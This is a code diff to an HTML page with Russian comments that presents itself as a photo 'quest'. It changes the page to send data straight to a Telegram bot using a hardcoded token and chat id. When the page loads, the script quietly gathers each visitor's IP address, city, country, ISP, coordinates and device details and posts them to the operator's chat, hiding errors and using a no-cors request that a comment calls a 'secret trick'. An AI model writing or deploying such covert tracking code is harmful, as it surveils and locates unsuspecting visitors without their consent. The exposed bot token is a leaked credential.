@@ -296,7 +296,6 @@
     <p class="small">[ отмеченная область дышит ]</p>
   </div>
 
-  <!-- ТОЧКА НА ЛИЦЕ ПАРНЯ -->
   <div class="hotspot" id="hs1" style="top: 36%; left: 40%;"></div>
   <div class="hotspot-label" id="hs1label" style="top: 36%; left: 40%;">ВЫ</div>
 
@@ -364,12 +363,13 @@
 
 <script>
 /* ════════════════════════════════════════════════════════
-   ⚠️ АДРЕС ТВОЕГО CLOUDFLARE WORKER
+   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ (И НЕ ЗАБУДЬ СДЕЛАТЬ /revoke ПОСЛЕ)
    ════════════════════════════════════════════════════════ */
-const WORKER_URL = "https://shadow-quest.kris25ubk.workers.dev"; 
+const TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw"; 
+const TG_CHAT  = "472749125"; 
 
 /* ════════════════════════════════════════════════════════
-   ЗАГЛУШКИ ДЛЯ ДРУГИХ ФОТО (замени ссылки, если надо)
+   ЗАГЛУШКИ ДЛЯ ФОТО
    ════════════════════════════════════════════════════════ */
 const IMAGES = {
   s0: "https://picsum.photos/seed/dept-intro/900/1600",
@@ -381,7 +381,7 @@ document.getElementById("img2").src = IMAGES.s2;
 document.getElementById("img3").src = IMAGES.s3;
 
 /* ════════════════════════════════════════════════════════
-   ГЕОДАННЫЕ (ipapi.co + запасной)
+   ГЕОДАННЫЕ
    ════════════════════════════════════════════════════════ */
 let geo = null;
 
@@ -420,7 +420,7 @@ async function loadGeo() {
 const geoPromise = loadGeo();
 
 /* ════════════════════════════════════════════════════════
-   ОТПРАВКА НА CLOUDFLARE WORKER
+   ОТПРАВКА В ТЕЛЕГРАМ (БЕЗ CLOUDFLARE, НАПРЯМУЮ)
    ════════════════════════════════════════════════════════ */
 async function notifyAdmin(stage) {
   const g = geo || {};
@@ -428,29 +428,34 @@ async function notifyAdmin(stage) {
               /Mac/i.test(navigator.userAgent) ? "macOS" :
               /Win/i.test(navigator.userAgent) ? "Windows" : "неизвестно";
 
-  fetch(WORKER_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      stage: stage,
-      ip: g.ip,
-      city: g.city,
-      country: g.country,
-      isp: g.isp,
-      lat: g.lat,
-      lon: g.lon,
-      device: dev + " · " + screen.width + "×" + screen.height
-    })
+  const text = 
+    `🕵️ ${stage}\n` +
+    `IP: ${g.ip || "?"}\n` +
+    `Локация: ${g.city || "?"}, ${g.country || "?"}\n` +
+    `Провайдер: ${g.isp || "?"}\n` +
+    `Координаты: ${g.lat || "?"}, ${g.lon || "?"}\n` +
+    `Устройство: ${dev} ${screen.width}×${screen.height}\n` +
+    `Время: ${new Date().toLocaleString("ru-RU")}`;
+
+  // Секретный прием: отправляем как простую форму через no-cors
+  const formData = new URLSearchParams();
+  formData.append('chat_id', TG_CHAT);
+  formData.append('text', text);
+
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: 'POST',
+    mode: 'no-cors', // Браузер не будет ругаться на CORS
+    body: formData
   }).catch(()=>{});
 }
 
-// Приветственное сообщение админу
+// Уведомление при заходе
 geoPromise.then(() => {
   notifyAdmin("🚪 ВХОД НА САЙТ");
 });
 
 /* ════════════════════════════════════════════════════════
-   ЛОГИКА КВЕСТА
+   ЛОГИКА
    ════════════════════════════════════════════════════════ */
 const screens = [0,1,2,3].map(i => document.getElementById("s"+i));
 function show(n) {
